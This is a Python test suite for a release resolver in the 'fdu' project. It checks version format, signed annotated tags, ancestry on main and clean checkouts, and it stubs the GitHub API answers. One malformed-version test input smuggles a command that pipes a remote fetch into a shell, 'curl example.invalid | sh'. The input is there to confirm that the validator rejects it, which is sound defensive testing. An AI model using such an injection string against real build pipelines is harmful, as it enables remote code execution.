"""Tests for release identity resolution."""

from __future__ import annotations

import contextlib
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Any
from unittest import mock

from scripts.release import resolve_plan
from scripts.release.resolve_plan import (
    ReleasePlan,
    resolve,
    validate_checkout,
    validate_published_tag,
)


class ResolvePlanTests(unittest.TestCase):
    """Release and rehearsal identity rules."""

    def test_rehearsal_never_publishes(self) -> None:
        plan = resolve("0.1.0", "rehearsal", "refs/heads/main", "a" * 40)
        self.assertFalse(plan.publish)
        self.assertEqual(plan.release_tag, "v0.1.0")
        self.assertEqual(plan.artifact_tag, "rehearsal-aaaaaaaaa")

    def test_release_requires_exact_version_tag(self) -> None:
        plan = resolve("0.1.0", "release", "refs/tags/v0.1.0", "b" * 40)
        self.assertTrue(plan.publish)
        with self.assertRaisesRegex(ValueError, "release ref"):
            resolve("0.1.0", "release", "refs/tags/v0.1.1", "b" * 40)

    def test_commit_must_be_hexadecimal(self) -> None:
        with self.assertRaisesRegex(ValueError, "hexadecimal"):
            resolve("0.1.0", "rehearsal", "", "not-a-commit")

    def test_version_must_be_a_plain_release(self) -> None:
        # The version reaches release.yml's `run:` lines through `${{ }}`, so only the
        # `X.Y.Z` shape passes, in either mode, whatever the manifest says.
        malformed = [
            "",
            "0.2",
            "v0.2.1",
            "0.2.01",
            "0.2.1-rc.1",
            "0.2.1+build",
            "0.2.1\n",
            '0.2.1"; curl example.invalid | sh; echo "',
        ]
        for version in malformed:
            for mode, ref in (("rehearsal", ""), ("release", f"refs/tags/v{version}")):
                with (
                    self.subTest(version=version, mode=mode),
                    self.assertRaisesRegex(ValueError, "version must be X.Y.Z"),
                ):
                    resolve(version, mode, ref, "a" * 40)


COMMIT = "c" * 40
TAG_OBJECT = "d" * 40
BASE = "https://api.github.com/repos/jlevy/fdu"
REF_URL = f"{BASE}/git/ref/tags/v0.2.1"
TAG_URL = f"{BASE}/git/tags/{TAG_OBJECT}"
COMPARE_URL = f"{BASE}/compare/{COMMIT}...main?per_page=1"


class PublishedTagTests(unittest.TestCase):
    """What GitHub must say about the tag and the commit before a release may build."""

    PLAN = resolve("0.2.1", "release", "refs/tags/v0.2.1", COMMIT)

    def answers(self) -> dict[str, Any]:
        return {
            REF_URL: {"ref": "refs/tags/v0.2.1", "object": {"type": "tag", "sha": TAG_OBJECT}},
            TAG_URL: {
                "tag": "v0.2.1",
                "object": {"type": "commit", "sha": COMMIT},
                "verification": {"verified": True, "reason": "valid"},
            },
            COMPARE_URL: {"status": "ahead", "merge_base_commit": {"sha": COMMIT}},
        }

    def check(self, answers: dict[str, Any], plan: ReleasePlan | None = None) -> list[str]:
        return validate_published_tag(
            plan or self.PLAN, "jlevy/fdu", TAG_OBJECT, lambda url: answers.get(url)
        )

    def test_a_signed_annotated_tag_on_main_passes(self) -> None:
        verified = self.check(self.answers())
        self.assertIn("GitHub reports its signature verified (reason: valid)", verified)
        identical = self.answers()
        identical[COMPARE_URL]["status"] = "identical"
        self.assertIn(f"{COMMIT} is on main (identical)", self.check(identical))

    def test_each_missing_proof_is_refused(self) -> None:
        def edited(url: str, value: Any = None, **fields: Any) -> dict[str, Any]:
            answers = self.answers()
            if fields:
                answers[url] = {**answers[url], **fields}
            else:
                answers[url] = value
            return answers

        unverified = self.answers()
        unverified[TAG_URL]["verification"] = {"verified": False, "reason": "unsigned"}
        silent = self.answers()
        del silent[TAG_URL]["verification"]
        truthy = self.answers()
        truthy[TAG_URL]["verification"] = {"verified": "true", "reason": "valid"}
        cases = {
            "has no tag v0.2.1": edited(REF_URL),
            # A lightweight tag is a ref straight to the commit, with no signature to check.
            "is a commit ref, not an annotated tag": edited(
                REF_URL, object={"type": "commit", "sha": COMMIT}
            ),
            # Origin's tag must be the object the checkout holds, not one pushed since.
            f"is tag object {'e' * 40}, but the checkout holds": edited(
                REF_URL, object={"type": "tag", "sha": "e" * 40}
            ),
            "has no tag object": edited(TAG_URL),
            "is named 'v0.2.0'": edited(TAG_URL, tag="v0.2.0"),
            f"names commit {'f' * 40}, not the planned commit": edited(
                TAG_URL, object={"type": "commit", "sha": "f" * 40}
            ),
            "names tree": edited(TAG_URL, object={"type": "tree", "sha": COMMIT}),
            r"signature verified \(reason: unsigned\)": unverified,
            r"signature verified \(reason: None\)": silent,
            # Only the JSON boolean counts: a string that reads as true is not a verdict.
            r"signature verified \(reason: valid\)": truthy,
            "cannot compare": edited(COMPARE_URL),
            "status 'behind'": edited(COMPARE_URL, status="behind"),
            "status 'diverged'": edited(
                COMPARE_URL, status="diverged", merge_base_commit={"sha": "a" * 40}
            ),
            # A status alone is not the ancestry: the merge base has to be the commit itself.
            f"merge base {'a' * 40}": edited(COMPARE_URL, merge_base_commit={"sha": "a" * 40}),
            "merge base None": edited(COMPARE_URL, merge_base_commit=None),
        }
        for message, answers in cases.items():
            with self.subTest(message=message), self.assertRaisesRegex(ValueError, message):
                self.check(answers)


def git(root: Path, *args: str) -> str:
    """Run git in a throwaway repository with a fixed identity and no signing."""
    identity = [
        "-c",
        "user.name=Release Test",
        "-c",
        "user.email=release@example.invalid",
        "-c",
        "commit.gpgsign=false",
        "-c",
        "tag.gpgsign=false",
    ]
    return subprocess.run(
        ["git", *identity, *args], cwd=root, check=True, capture_output=True, text=True
    ).stdout.strip()


class ThrowawayRepository(unittest.TestCase):
    """A repository of two commits, the second carrying the 0.2.1 fdu manifest."""

    def setUp(self) -> None:
        # A suite run from a git hook inherits GIT_DIR, which would point every query at
        # the hook's repository instead of the throwaway one.
        scrubbed = {key: value for key, value in os.environ.items() if not key.startswith("GIT_")}
        patcher = mock.patch.dict(os.environ, scrubbed, clear=True)
        patcher.start()
        self.addCleanup(patcher.stop)
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        self.root = Path(temporary.name)
        git(self.root, "init", "--quiet", "--initial-branch=main")
        (self.root / "README").write_text("fdu\n", encoding="utf-8")
        git(self.root, "add", "README")
        git(self.root, "commit", "--quiet", "-m", "first")
        self.first = git(self.root, "rev-parse", "HEAD")
        (self.root / "README").write_text("fdu 0.2.1\n", encoding="utf-8")
        # main() reads the version from the fdu manifest.
        manifest = self.root / "crates" / "fdu" / "Cargo.toml"
        manifest.parent.mkdir(parents=True)
        manifest.write_text('[package]\nname = "fdu"\nversion = "0.2.1"\n', encoding="utf-8")
        git(self.root, "add", "README", "crates/fdu/Cargo.toml")
        git(self.root, "commit", "--quiet", "-m", "second")
        self.head = git(self.root, "rev-parse", "HEAD")


class CheckoutTests(ThrowawayRepository):
    """The local half: a clean checkout of the commit an annotated release tag names."""

    def plan(self, mode: str = "release") -> ReleasePlan:
        return resolve("0.2.1", mode, "refs/tags/v0.2.1", self.head)

    def test_an_annotated_tag_on_head_passes_and_names_its_object(self) -> None:
        git(self.root, "tag", "-a", "v0.2.1", "-m", "fdu 0.2.1")
        tag_object = validate_checkout(self.root, self.plan())
        self.assertEqual(tag_object, git(self.root, "rev-parse", "refs/tags/v0.2.1"))
        self.assertNotEqual(tag_object, self.head)

    def test_a_rehearsal_needs_no_tag(self) -> None:
        self.assertIsNone(validate_checkout(self.root, self.plan("rehearsal")))

    def test_a_lightweight_tag_is_refused(self) -> None:
        # `git tag --points-at HEAD` lists it, which is all the check once asked.
        git(self.root, "tag", "v0.2.1")
        self.assertIn("v0.2.1", git(self.root, "tag", "--points-at", "HEAD").splitlines())
        with self.assertRaisesRegex(ValueError, "is a commit object; a release needs"):
            validate_checkout(self.root, self.plan())

    def test_a_tag_on_another_commit_is_refused(self) -> None:
        git(self.root, "tag", "-a", "v0.2.1", "-m", "fdu 0.2.1", self.first)
        with self.assertRaisesRegex(ValueError, "does not identify HEAD"):
            validate_checkout(self.root, self.plan())

    def test_a_dirty_or_different_checkout_is_refused(self) -> None:
        git(self.root, "tag", "-a", "v0.2.1", "-m", "fdu 0.2.1")
        with self.assertRaisesRegex(ValueError, "does not match planned commit"):
            validate_checkout(self.root, resolve("0.2.1", "release", "refs/tags/v0.2.1", "a" * 40))
        (self.root / "README").write_text("edited\n", encoding="utf-8")
        with self.assertRaisesRegex(ValueError, "must be clean"):
            validate_checkout(self.root, self.plan())


class MainTests(ThrowawayRepository):
    """
    The command release.yml runs, which is the only caller of the GitHub half.

    A refactor of main() that dropped the GitHub checks, or ran them under a rehearsal
    plan, would pass every test of the two halves, so these run it end to end on the
    throwaway repository with GitHub's answers substituted.
    """

    def setUp(self) -> None:
        super().setUp()
        git(self.root, "tag", "-a", "v0.2.1", "-m", "fdu 0.2.1")
        self.tag_object = git(self.root, "rev-parse", "refs/tags/v0.2.1")
        self.urls = [
            f"{BASE}/git/ref/tags/v0.2.1",
            f"{BASE}/git/tags/{self.tag_object}",
            f"{BASE}/compare/{self.head}...main?per_page=1",
        ]
        outputs = tempfile.TemporaryDirectory()
        self.addCleanup(outputs.cleanup)
        self.github_output = Path(outputs.name) / "github-output"

    def answers(self, verified: bool = True) -> dict[str, Any]:
        ref_url, tag_url, compare_url = self.urls
        return {
            ref_url: {"ref": "refs/tags/v0.2.1", "object": {"type": "tag", "sha": self.tag_object}},
            tag_url: {
                "tag": "v0.2.1",
                "object": {"type": "commit", "sha": self.head},
                "verification": {"verified": verified, "reason": "valid"},
            },
            compare_url: {"status": "identical", "merge_base_commit": {"sha": self.head}},
        }

    def run_main(self, mode: str, ref: str, answers: dict[str, Any]) -> mock.MagicMock:
        """Run the plan step's command line, returning the stand-in for `github_get`."""
        argv = [
            "resolve_plan.py",
            *("--root", str(self.root), "--mode", mode, "--ref", ref, "--commit", self.head),
            *("--repository", "jlevy/fdu", "--validate-checkout"),
            *("--github-output", str(self.github_output)),
        ]
        stdout = io.StringIO()
        with (
            mock.patch.object(sys, "argv", argv),
            mock.patch.dict(os.environ, {"GITHUB_TOKEN": "read-only-token"}),
            mock.patch.object(
                resolve_plan, "github_get", side_effect=lambda url, token: answers.get(url)
            ) as github_get,
            contextlib.redirect_stdout(stdout),
            contextlib.redirect_stderr(io.StringIO()),
        ):
            try:
                resolve_plan.main()
            finally:
                self.stdout = stdout.getvalue()
        return github_get

    def outputs(self) -> dict[str, str]:
        lines = self.github_output.read_text(encoding="utf-8").splitlines()
        return dict(line.split("=", 1) for line in lines)

    def test_a_release_reads_each_github_proof_with_the_token(self) -> None:
        github_get = self.run_main("release", "refs/tags/v0.2.1", self.answers())
        self.assertEqual(
            github_get.call_args_list, [mock.call(url, "read-only-token") for url in self.urls]
        )
        self.assertTrue(json.loads(self.stdout)["publish"])
        self.assertEqual(self.outputs()["publish"], "true")

    def test_a_github_refusal_stops_the_release(self) -> None:
        with self.assertRaisesRegex(ValueError, "signature verified"):
            self.run_main("release", "refs/tags/v0.2.1", self.answers(verified=False))
        self.assertEqual(self.stdout, "")
        self.assertFalse(self.github_output.exists())

    def test_a_rehearsal_reads_nothing_from_github(self) -> None:
        # The same checkout, annotated tag and all: only the mode differs.
        github_get = self.run_main("rehearsal", "refs/heads/release/v0.2.1", self.answers())
        github_get.assert_not_called()
        self.assertFalse(json.loads(self.stdout)["publish"])
        self.assertEqual(self.outputs()["publish"], "false")


if __name__ == "__main__":
    unittest.main()
